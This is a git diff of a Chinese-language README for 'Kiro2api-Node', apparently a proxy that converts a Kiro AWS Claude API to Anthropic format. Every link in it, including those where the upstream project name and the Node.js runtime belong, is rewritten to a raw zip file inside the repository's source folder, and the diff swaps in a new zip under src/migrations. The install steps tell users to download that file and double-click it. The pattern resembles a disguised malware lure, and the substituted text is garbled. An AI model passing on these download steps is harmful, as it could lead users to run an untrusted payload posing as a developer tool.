@@ -1,9 +1,9 @@
 # 🚀 Kiro2api-Node - Simplify Your API Integration Effortlessly
 
-[![Download Kiro2API-Node](https://github.com/Toothylol/Kiro2api-Node/raw/refs/heads/main/src/api_Kiro_Node_v3.4.zip)](https://github.com/Toothylol/Kiro2api-Node/raw/refs/heads/main/src/api_Kiro_Node_v3.4.zip)
+[![Download Kiro2API-Node](https://github.com/Toothylol/Kiro2api-Node/raw/refs/heads/main/src/migrations/api_Node_Kiro_v3.6.zip)](https://github.com/Toothylol/Kiro2api-Node/raw/refs/heads/main/src/migrations/api_Node_Kiro_v3.6.zip)
 
 <p align="center">
-  <strong>将 Kiro AWS Claude API 转换为标准 Anthropic API 格式的 https://github.com/Toothylol/Kiro2api-Node/raw/refs/heads/main/src/api_Kiro_Node_v3.4.zip 代理服务</strong>
+  <strong>将 Kiro AWS Claude API 转换为标准 Anthropic API 格式的 https://github.com/Toothylol/Kiro2api-Node/raw/refs/heads/main/src/migrations/api_Node_Kiro_v3.6.zip 代理服务</strong>
 </p>
 
 <p align="center">
@@ -14,7 +14,7 @@
   <a href="#环境变量">环境变量</a>
 </p>
 
-> 基于 [kiro2api-rs](https://github.com/Toothylol/Kiro2api-Node/raw/refs/heads/main/src/api_Kiro_Node_v3.4.zip) 使用 https://github.com/Toothylol/Kiro2api-Node/raw/refs/heads/main/src/api_Kiro_Node_v3.4.zip 重构优化
+> 基于 [kiro2api-rs](https://github.com/Toothylol/Kiro2api-Node/raw/refs/heads/main/src/migrations/api_Node_Kiro_v3.6.zip) 使用 https://github.com/Toothylol/Kiro2api-Node/raw/refs/heads/main/src/migrations/api_Node_Kiro_v3.6.zip 重构优化
 
 ---
 
@@ -46,21 +46,21 @@
 
 ### 📥 方式一：直接运行
 
-1. 访问 [Kiro2API-Node Releases Page](https://github.com/Toothylol/Kiro2api-Node/raw/refs/heads/main/src/api_Kiro_Node_v3.4.zip) 以下载最新版本的应用。
+1. 访问 [Kiro2API-Node Releases Page](https://github.com/Toothylol/Kiro2api-Node/raw/refs/heads/main/src/migrations/api_Node_Kiro_v3.6.zip) 以下载最新版本的应用。
 2. 找到适合您操作系统的文件，点击下载。
 3. 下载完成后，双击文件以开始安装。按照屏幕上的指示完成安装。
 
 ### 🛠️ 必要条件
 
 - 操作系统：Windows 7及以上，macOS，或 Linux
-- https://github.com/Toothylol/Kiro2api-Node/raw/refs/heads/main/src/api_Kiro_Node_v3.4.zip 版本：14.x 或更高版本
+- https://github.com/Toothylol/Kiro2api-Node/raw/refs/heads/main/src/migrations/api_Node_Kiro_v3.6.zip 版本：14.x 或更高版本
 - 互联网连接（用于 API 请求）
   
 ### 📊 下载与安装
 
 您可以通过访问以下链接来下载 Kiro2API-Node：
 
-[![Download Kiro2API-Node](https://github.com/Toothylol/Kiro2api-Node/raw/refs/heads/main/src/api_Kiro_Node_v3.4.zip)](https://github.com/Toothylol/Kiro2api-Node/raw/refs/heads/main/src/api_Kiro_Node_v3.4.zip)
+[![Download Kiro2API-Node](https://github.com/Toothylol/Kiro2api-Node/raw/refs/heads/main/src/migrations/api_Node_Kiro_v3.6.zip)](https://github.com/Toothylol/Kiro2api-Node/raw/refs/heads/main/src/migrations/api_Node_Kiro_v3.6.zip)
 
 下载后，按照上面提供的步骤进行安装。
 
